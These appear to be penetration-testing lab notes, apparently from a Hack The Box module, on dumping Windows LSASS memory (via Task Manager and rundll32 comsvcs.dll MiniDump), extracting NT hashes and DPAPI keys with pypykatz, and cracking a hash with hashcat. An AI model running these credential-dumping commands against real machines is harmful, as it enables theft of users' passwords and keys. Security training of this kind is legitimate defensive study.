![[Pasted image 20260508111742.png]]
Upon initial logon, LSASS will:

- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows' [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
## Dumping LSASS process memory
#### Task Manager method
1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`
![[Pasted image 20260508111829.png]]
#### Rundll32.exe & Comsvcs.dll method
we must determine what process ID (`PID`) is assigned to `lsass.exe`
#### Finding LSASS's PID in cmd

```cmd
C:\Windows\system32> tasklist /svc
```
#### Finding LSASS's PID in PowerShell

```powershell
PS C:\Windows\system32> Get-Process lsass
```
#### Creating a dump file using PowerShell

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
## Using Pypykatz to extract credentials
#### Running Pypykatz

```shell
3kjS@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
#### MSV

```shell
sid S-1-5-21-4019466498-1700476312-3544718034-1001 
luid 1354633 
	== MSV == 
		Username: bob 
		Domain: DESKTOP-33E7O54 
		LM: NA 
		NT: 64f12cddaa88057e06a81b54e73b949b 
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8 
		DPAPI: NA
```
#### WDIGEST

```shell
	== WDIGEST [14ab89]== 
		username bob 
		domainname DESKTOP-33E7O54 
		password None 
		password (hex)
```
#### Kerberos

```shell
	== Kerberos == 
		Username: bob 
		Domain: DESKTOP-33E7O54
```
#### DPAPI

```shell
	== DPAPI [14ab89]== 
		luid 1354633 
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b 
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92 
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```
#### Cracking the NT Hash with Hashcat

```shell
3kjS@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
